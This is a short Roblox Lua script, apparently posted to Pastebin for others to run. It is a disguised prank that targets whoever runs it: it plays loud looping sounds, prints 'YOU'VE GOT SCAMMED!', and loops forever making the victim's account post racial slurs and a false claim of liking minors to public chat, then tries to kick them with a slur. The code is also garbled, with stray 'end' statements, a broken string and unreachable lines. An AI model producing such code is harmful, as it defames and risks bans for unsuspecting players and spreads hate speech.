-- Please use it with PasteBin.

local samplesound = Instance.new('Sound') samplesound.Parent = game:GetService('Players').LocalPlayer.PlayerGui
	samplesound.Looped = true samplesound.SoundId = 'rbxassetid://6018028320'
	samplesound:Play()
	samplesound.Name = 'SampleSound'
	samplesound.Volume = 10
end

local samplesound = Instance.new('Sound') samplesound.Parent = game:GetService('Players').LocalPlayer.PlayerGui
	samplesound.Looped = true samplesound.SoundId = 'rbxassetid://7153945201'
	samplesound:Play() samplesound.Name = 'SampleSound'
	samplesound.Volume = 10
end

print('YOU'VE GOT SCAMMED!')

repeat
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Im gay, nigga fucker.","All")
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I like minors.","All")
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ok old nigga. 👴🏿","All")
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("pog, minecraft, lol your hacking","All")
until false

wait(120)
players.LocalPlayer:Kick("You are banned, niggafucker.")
